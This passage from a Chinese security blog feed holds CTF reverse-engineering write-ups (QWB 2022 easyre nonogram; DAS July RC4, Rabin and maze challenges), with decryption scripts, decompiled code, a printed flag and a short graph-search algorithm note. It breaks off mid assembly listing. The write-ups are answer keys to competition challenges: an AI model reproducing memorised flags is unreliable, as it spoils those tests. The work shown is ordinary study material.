srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071557274.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071557274.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xorKey = &#123;<span class="number">8723</span>: <span class="number">2533025110152939745</span>, <span class="number">8739</span>: <span class="number">5590097037203163468</span>, <span class="number">8755</span>: <span class="number">17414346542877855401</span>, <span class="number">8771</span>: <span class="number">17520503086133755340</span>, <span class="number">8787</span>: <span class="number">12492599841064285544</span>, <span class="number">8803</span>: <span class="number">12384833368350302160</span>, <span class="number">8819</span>: <span class="number">11956541642520230699</span>, <span class="number">8835</span>: <span class="number">12628929057681570616</span>, <span class="number">8851</span>: <span class="number">910654967627959011</span>, <span class="number">8867</span>: <span class="number">5684234031469876551</span>, <span class="number">8883</span>: <span class="number">6000358478182005051</span>, <span class="number">8899</span>: <span class="number">3341586462889168127</span>, <span class="number">8915</span>: <span class="number">11094889238442167020</span>, <span class="number">8931</span>: <span class="number">17237527861538956365</span>, <span class="number">8947</span>: <span class="number">17178915143649401084</span>, <span class="number">8963</span>: <span class="number">11176844209899222046</span>, <span class="number">8979</span>: <span class="number">18079493192679046363</span>, <span class="number">8995</span>: <span class="number">7090159446630928781</span>, <span class="number">9011</span>: <span class="number">863094436381699168</span>, <span class="number">9027</span>: <span class="number">6906972144372600884</span>, <span class="number">9043</span>: <span class="number">16780793948225765908</span>, <span class="number">9059</span>: <span class="number">7086655467811962655</span>, <span class="number">9075</span>: <span class="number">13977154540038163446</span>, <span class="number">9091</span>: <span class="number">7066662532691991888</span>, <span class="number">9107</span>: <span class="number">15157921356638311270</span>, <span class="number">9123</span>: <span class="number">12585839823593393444</span>, <span class="number">9139</span>: <span class="number">1360651393631625694</span>, <span class="number">9155</span>: <span class="number">2139328426318955142</span>, <span class="number">9171</span>: <span class="number">2478274715212481947</span>, <span class="number">9187</span>: <span class="number">12876028885252459748</span>, <span class="number">9203</span>: <span class="number">18132176846268847269</span>, <span class="number">9219</span>: <span class="number">17242441603067001509</span>, <span class="number">9235</span>: <span class="number">8492111998925944081</span>, <span class="number">9251</span>: <span class="number">14679986489201789069</span>, <span class="number">9267</span>: <span class="number">13188777131396593592</span>, <span class="number">9283</span>: <span class="number">5298970373130621883</span>, <span class="number">9299</span>: <span class="number">525902164359904478</span>, <span class="number">9315</span>: <span class="number">2117701741234018776</span>, <span class="number">9331</span>: <span class="number">9158760851580517972</span>&#125;</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x2213</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = get_qword(addr)</span><br><span class="line">    key = xorKey[addr]</span><br><span class="line">    dec = data ^ key</span><br><span class="line">    idc.patch_qword(addr, dec)</span><br><span class="line">    addr += <span class="number">16</span></span><br></pre></td></tr></table></figure><p>之后跑脚本</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BYTE *__fastcall <span class="title">sub_21F9</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+20h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+24h] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+28h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+2Ch] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+30h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+34h] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+38h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// [rsp+3Ch] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+40h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+44h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  __debugbreak();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">24</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    v9 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v12 &lt;= <span class="number">24</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(<span class="number">25</span> * i + v12 + a1) )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v11;</span><br><span class="line">        v10 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v10 )</span><br><span class="line">        &#123;</span><br><span class="line">          *(_BYTE *)(a2 + <span class="number">25LL</span> * i + v9) = v11;</span><br><span class="line">          v11 = <span class="number">0</span>;</span><br><span class="line">          ++v9;</span><br><span class="line">        &#125;</span><br><span class="line">        v10 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( ++v12 == <span class="number">25</span> &amp;&amp; v10 )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_BYTE *)(a2 + <span class="number">25LL</span> * i + v9) = v11;</span><br><span class="line">        v11 = <span class="number">0</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = (_BYTE *)(<span class="number">25LL</span> * i + a2);</span><br><span class="line">    *result = v9 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">24</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v7 &lt;= <span class="number">24</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(<span class="number">25</span> * v7 + j + a1) )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v6;</span><br><span class="line">        v5 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          *(_BYTE *)(a3 + <span class="number">25LL</span> * j + v4) = v6;</span><br><span class="line">          v6 = <span class="number">0</span>;</span><br><span class="line">          ++v4;</span><br><span class="line">        &#125;</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( ++v7 == <span class="number">25</span> &amp;&amp; v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_BYTE *)(a3 + <span class="number">25LL</span> * j + v4) = v6;</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = (_BYTE *)(<span class="number">25LL</span> * j + a3);</span><br><span class="line">    *result = v4 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  __debugbreak();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是一个数织游戏</p><p>于是很明显我们RE3的主函数的对比数据不对，于是这时候就去init段还有个preinit段找</p><p>同样的手法是通过偏移来进行了混淆，手动计算即可，最后拿到真实数据</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071945591.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071945591.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071952344.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208071952344.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208072006218.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208072006218.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>然后用网站解密</p><p><a href="https://handsomeone.github.io/Nonogram/">Nonogram (handsomeone.github.io)</a></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208072029451.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208072029451.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>还有一种动态调试：</p><p><a href="http://1.12.239.117:8090/archives/qwb2022-easyre#0x06-pre_init%E5%92%8Cinit">强网杯2022-Reverse-easyre wp</a></p></div>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux反调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搜索与图论</title>
      <link href="/2022/07/26/%E6%90%9C%E7%B4%A2%E4%B8%8E%E5%9B%BE%E8%AE%BA/"/>
      <url>/2022/07/26/%E6%90%9C%E7%B4%A2%E4%B8%8E%E5%9B%BE%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<div class="story post-story"><h2 id="树与图的存储"><a href="#树与图的存储" class="headerlink" title="树与图的存储"></a>树与图的存储</h2><p>树是一种特殊的图，与图的存储方式相同。<br>对于无向图中的边ab，存储两条有向边a-&gt;b, b-&gt;a。<br>因此我们可以只考虑有向图的存储。</p><p>(1) 邻接矩阵：g[a][b] 存储边a-&gt;b</p><p>(2) 邻接表：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对于每个点k，开一个单链表，存储k所有可以走到的点。h[k]存储这个单链表的头结点</span></span><br><span class="line"><span class="type">int</span> h[N], e[N], ne[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加一条边a-&gt;b</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = b, ne[idx] = h[a], h[a] = idx ++ ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="DFS"><a href="#DFS" class="headerlink" title="DFS"></a>DFS</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    st[u] = <span class="literal">true</span>; <span class="comment">// st[u] 表示点u已经被遍历过</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[u]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> j = e[i];</span><br><span class="line">        <span class="keyword">if</span> (!st[j]) <span class="built_in">dfs</span>(j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">st[<span class="number">1</span>] = <span class="literal">true</span>; <span class="comment">// 表示1号点已经被遍历过</span></span><br><span class="line">q.<span class="built_in">push</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (q.<span class="built_in">size</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">    q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> j = e[i];</span><br><span class="line">        <span class="keyword">if</span> (!st[j])</span><br><span class="line">        &#123;</span><br><span class="line">            st[j] = <span class="literal">true</span>; <span class="comment">// 表示点j已经被遍历过</span></span><br><span class="line">            q.<span class="built_in">push</span>(j);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DAS七月赛</title>
      <link href="/2022/07/25/DAS%E4%B8%83%E6%9C%88%E8%B5%9B/"/>
      <url>/2022/07/25/DAS%E4%B8%83%E6%9C%88%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<div class="story post-story"><h2 id="隐秘的角落"><a href="#隐秘的角落" class="headerlink" title="隐秘的角落"></a>隐秘的角落</h2><p>加密后的数据在init函数有异或0x23的操作，是rc4加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key, message</span>):</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = rc4_excrypt(message, s_box)</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(s ^ k))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(res)):</span><br><span class="line">        <span class="built_in">print</span>(res[i],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#a=[0xE0,0xB2,0x5F,0x3D,0x8F,0xFA,0x94,0xB6,0xE7,0x9D,0x6C,0x98,0x66,0xD2,0x0F,0xEA,0x6D,0x6F,0xBE,0xC5,0x71,0x40,0x08,0x1B,0xF6,0xF3,0xBD,0xA8,0x8D,0x09,0x7B,0x7C]</span></span><br><span class="line">a = [<span class="number">251</span>, <span class="number">198</span>, <span class="number">166</span>, <span class="number">157</span>, <span class="number">196</span>, <span class="number">219</span>, <span class="number">123</span>, <span class="number">86</span>, <span class="number">182</span>, <span class="number">70</span>, <span class="number">166</span>, <span class="number">192</span>, <span class="number">133</span>, <span class="number">100</span>, <span class="number">122</span>, <span class="number">154</span>, <span class="number">55</span>, <span class="number">76</span>, <span class="number">16</span>, <span class="number">150</span>, <span class="number">233</span>, <span class="number">167</span>, <span class="number">40</span>, <span class="number">196</span>, <span class="number">177</span>, <span class="number">45</span>, <span class="number">241</span>, <span class="number">222</span>, <span class="number">71</span>, <span class="number">59</span>, <span class="number">181</span>, <span class="number">243</span>, <span class="number">44</span>, <span class="number">125</span>, <span class="number">103</span>, <span class="number">29</span>]</span><br><span class="line">rc4_main(<span class="string">&quot;thisiskkk&quot;</span>,a)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到56e83694-f976-11eb-b343-faffc201c8e0</p><p>再md5加密小写就是flag</p></div><div class="story post-story"><h2 id="ezGo"><a href="#ezGo" class="headerlink" title="ezGo"></a>ezGo</h2><p>go题一些陌生的函数以及奇怪的变量配合动调体验更加</p><p>这里的循环的作用主要是把输入的40个字符的ASCII码拼接成一个大整数</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207251442361.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207251442361.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>然后就是平方取余比较</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207251444310.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207251444310.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>加密就是如下<br>$$<br>c&#x3D;m^2modn<br>$$<br>一种特殊的RSA加密形式，用rabnin算法解</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26491147/1658666540299-8485759d-fb39-4177-860b-b3154ee2aafc.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/26491147/1658666540299-8485759d-fb39-4177-860b-b3154ee2aafc.png?x-oss-process=image/resize,w_750,limit_0" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"></p><p>用yafu分解大质数，可以发现这两个质数都是模四余三，根据e&#x3D;2可知，这是一个rabin算法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment">#导入公钥</span></span><br><span class="line">n=<span class="number">131453094564548508772284336424680998857035326273571981446094083416917514535349876760437096547435610190391556347148927592380050533193934285571983556924577144473815598516557161</span></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line">c=<span class="number">33529281532734294938614341047870321616766628114182320093600990983456360122704185955921012051918080449587733939007294096845300395098833835443815283246602601870001850089370636</span></span><br><span class="line"><span class="comment">#n 在线分解</span></span><br><span class="line">p=<span class="number">17489158711316178659</span></span><br><span class="line">q=<span class="number">7516261744453902635364442762653073356746063224482072262455102025715350278471780391042196223686233375846890331396948280463168691132631674699134296333350979</span></span><br><span class="line">inv_p = gmpy2.invert(p, q)</span><br><span class="line">inv_q = gmpy2.invert(q, p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">a = (inv_p * p * mq + inv_q * q * mp) % n</span><br><span class="line">b = n - <span class="built_in">int</span>(a)</span><br><span class="line">c = (inv_p * p * mq - inv_q * q * mp) % n</span><br><span class="line">d = n - <span class="built_in">int</span>(c)</span><br><span class="line"><span class="comment">#因为rabin 加密有四种结果，全部列出。</span></span><br><span class="line">aa=[a,b,c,d]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> aa:</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(i)))</span><br></pre></td></tr></table></figure><p>得到flag：DASCTF{48fa8aa2b489e9adac1750ea16ddc7b5}</p></div><div class="story post-story"><h2 id="fantansic-maze"><a href="#fantansic-maze" class="headerlink" title="fantansic maze"></a>fantansic maze</h2><ul><li>sha256爆破</li><li>自动化路径求解</li><li>bfs算法</li></ul><p>首先是常规的sha256爆破</p><p>过了proof之后题目会给出远程程序的base64编码，将编码解码后写入文本再拖入IDA查看</p><p>其中有1000个相似的函数，其汇编代码大致如下(这里IDA F5看不出来啥东西)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000001358</span> function_0      proc near               ; CODE XREF: function_36+<span class="number">85</span>↓p</span><br><span class="line">.text:<span class="number">0000000000001358</span>                                         ; function_201+<span class="number">67</span>↓p ...</span><br><span class="line">.text:<span class="number">0000000000001358</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000001358</span>                 endbr64</span><br><span class="line">.text:<span class="number">000000000000135</span>C                 push    rbp</span><br><span class="line">.text:<span class="number">000000000000135</span>D                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000001360</span>                 sub     rsp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0000000000001364</span>                 mov     eax, cs:tmp</span><br><span class="line">.text:<span class="number">000000000000136</span>A                 add     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">000000000000136</span>D                 mov     cs:tmp, eax</span><br><span class="line">.text:<span class="number">0000000000001373</span>                 lea     rdi, aStep1     ; <span class="string">&quot;step1:&quot;</span></span><br><span class="line">.text:<span class="number">000000000000137</span>A                 call    sub_10C0</span><br><span class="line">.text:<span class="number">000000000000137F</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000001384</span>                 call    read_num</span><br><span class="line">.text:<span class="number">0000000000001389</span>                 mov     [rbp<span class="number">-4</span>], eax</span><br><span class="line">.text:<span class="number">000000000000138</span>C                 cmp     dword ptr [rbp<span class="number">-4</span>], <span class="number">0</span>Ah</span><br><span class="line">.text:<span class="number">0000000000001390</span>                 ja      loc_141E</span><br><span class="line">.text:<span class="number">0000000000001396</span>                 mov     eax, [rbp<span class="number">-4</span>]</span><br><span class="line">.text:<span class="number">0000000000001399</span>                 lea     rdx, ds:<span class="number">0</span>[rax*<span class="number">4</span>]</span><br><span class="line">.text:<span class="number">00000000000013</span>A1                 lea     rax, unk_3501C</span><br><span class="line">.text:<span class="number">00000000000013</span>A8                 mov     eax, [rdx+rax]</span><br><span class="line">.text:<span class="number">00000000000013</span>AB                 cdqe</span><br><span class="line">.text:<span class="number">00000000000013</span>AD                 lea     rdx, unk_3501C</span><br><span class="line">.text:<span class="number">00000000000013B</span>4                 add     rax, rdx</span><br><span class="line">.text:<span class="number">00000000000013B</span>7                 db      <span class="number">3</span>Eh</span><br><span class="line">.text:<span class="number">00000000000013B</span>7                 jmp     rax</span><br><span class="line">.text:<span class="number">00000000000013B</span>A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000000013B</span>A                 mov     eax, <span 